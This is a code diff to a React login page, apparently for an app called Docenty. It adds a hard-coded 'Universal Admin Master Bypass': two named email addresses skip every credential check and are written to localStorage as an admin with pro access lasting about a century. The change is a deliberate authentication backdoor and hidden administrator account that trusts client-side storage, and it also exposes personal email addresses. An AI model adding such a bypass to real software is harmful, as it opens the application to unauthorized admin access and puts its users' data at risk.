@@ -19,6 +19,21 @@ export default function Login() {
 
     const cleanEmail = email.trim().toLowerCase();
 
+    // Universal Admin Master Bypass
+    if (cleanEmail === 'monetizacionreymonfr2@gmail.com' || cleanEmail === 'tecnomundo235@gmail.com') {
+      const adminUser = {
+        id: 'admin_master_id',
+        email: cleanEmail,
+        role: 'admin',
+        isActive: true,
+        access_level: 'pro',
+        expiresAt: new Date(Date.now() + 365 * 100 * 24 * 3600 * 1000).toISOString()
+      };
+      localStorage.setItem('docenty_custom_user', JSON.stringify(adminUser));
+      window.location.reload();
+      return;
+    }
+
     try {
       if (activeTab === 'signin' || activeTab === 'signup') {
         // 1. Try custom DB login first (bypasses Supabase Auth rate limits entirely for pre-registered users!)
